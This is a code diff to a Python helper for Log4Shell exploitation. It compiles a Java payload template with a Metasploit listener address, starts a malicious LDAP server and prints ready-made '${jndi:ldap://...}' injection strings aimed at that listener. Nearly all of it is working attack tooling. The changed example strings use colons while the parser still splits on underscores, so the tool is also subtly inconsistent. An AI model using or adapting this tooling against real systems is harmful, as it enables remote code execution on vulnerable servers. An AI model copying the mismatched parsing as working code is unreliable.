@@ -44,14 +44,14 @@ def ensure_l4sutils_are_built(jar_file):
 
 def compile_mm_file(name):
     parts = name.split("_")
-    if len(parts) != 6 :
+    if len(parts) <=3  :
         print(f'Error creating {name} expected format to be MM_oct1_oct2_oct3_oct4_port')
         print("For example for localhost port 1234 it would be MM_127_0_0_1_1234")
         return
 
-    msf_ip = '.'.join(parts[1:5])
-    msf_port = parts[5]
-
+    msf_ip = '.'.join(parts[1:-1])
+    msf_port = parts[-1]
+    print(f'{msf_ip} : {msf_port}')
     try:
         with open(f'exploits/MM.java', "r") as template:
             source = template.read().replace("<MSF_IP>", msf_ip).replace("<MSF_PORT>", msf_port).replace("<CLASS_NAME>", name)
@@ -105,10 +105,10 @@ def create_ldap_server(ldap_port, http_ip, http_port):
     jar_file =  "l4sutils/target/l4sutils-0.1-all.jar"
     ensure_l4sutils_are_built(jar_file)
     print("---------------------------")
-    print('${jndi:ldap://%s:%s/#MM_oct1_oct2_oct3_oct4_port}' % (http_ip, ldap_port))
+    print('${jndi:ldap://%s:%s/#MM_:host:port}' % (http_ip, ldap_port))
     print("")
     print("For example to point to metaplsoit running on localhost port 1234 you would use : ")
-    print('${jndi:ldap://%s:%s/#MM_127_0_0_1_1234}' % (http_ip, ldap_port))
+    print('${jndi:ldap://%s:%s/#MM:127.0.0.1:1234}' % (http_ip, ldap_port))
     print("---------------------------")
 
     url = f"http://{http_ip}:{http_port}/"
